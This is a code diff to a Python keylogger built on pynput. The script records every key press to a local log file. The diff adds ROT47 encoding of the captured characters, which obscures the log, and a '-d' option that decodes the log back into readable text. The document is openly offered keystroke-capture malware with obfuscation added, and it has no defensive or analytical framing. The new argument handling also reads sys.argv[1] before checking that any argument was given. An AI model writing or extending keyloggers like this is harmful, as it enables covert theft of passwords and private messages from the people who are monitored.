@@ -1,3 +1,4 @@
+import sys
 from pynput.keyboard import Key, Listener
 from datetime import datetime
 
@@ -7,10 +8,17 @@ def file_write(txt):
 	with open("log.txt", "a") as fp:
 		fp.write(txt)
 
-fmt = datetime.now().strftime("%d/%m/%Y")
-sz = len(fmt) + 3
-div = "=" * (127 - sz)
-file_write("[%s] %s\n" % (fmt, div))
+def encode_rot47_char(c, key="!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~"):
+	try:
+		pos = key.index(c)
+		npos = (pos + 47) % (len(key))
+		return key[npos]
+	except ValueError:
+		return c
+
+def decode_rot47_char(c):
+	drot47 = "PQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO"
+	return encode_rot47_char(c, key=drot47)
 
 def buffer_flush():
 	global buffer
@@ -24,7 +32,7 @@ def buffer_write_char(c):
 	if isinstance(c, str) and len(c) == 0: return
 	if isinstance(c, str) and len(c) > 1: c = c[0]
 	if len(buffer) >= 127: buffer_flush()
-	buffer.append(c)
+	buffer.append(encode_rot47_char(c))
 	print("C: %s" % c)
 
 def buffer_write_text(line):
@@ -79,5 +87,21 @@ def _key_press(key):
 			buffer_write_text("[ENTER] ")
 			buffer_flush()
 
-with Listener(on_press=_key_press) as ls:
-	ls.join()
+if sys.argv[1] == "-d" and len(sys.argv) == 3:
+	lines = []
+	with open("log.txt", "r") as fp:
+		lines = fp.readlines()
+	with open("log.d.txt", "w") as fp:
+		for line in lines:
+			dline = ""
+			for c in line.strip("\n "):
+				dline += decode_rot47_char(c)
+			fp.write(dline + "\n")
+else:
+	fmt = datetime.now().strftime("%d/%m/%Y")
+	sz = len(fmt) + 3
+	div = "=" * (127 - sz)
+	file_write("[%s] %s\n" % (fmt, div))
+
+	with Listener(on_press=_key_press) as ls:
+		ls.join()
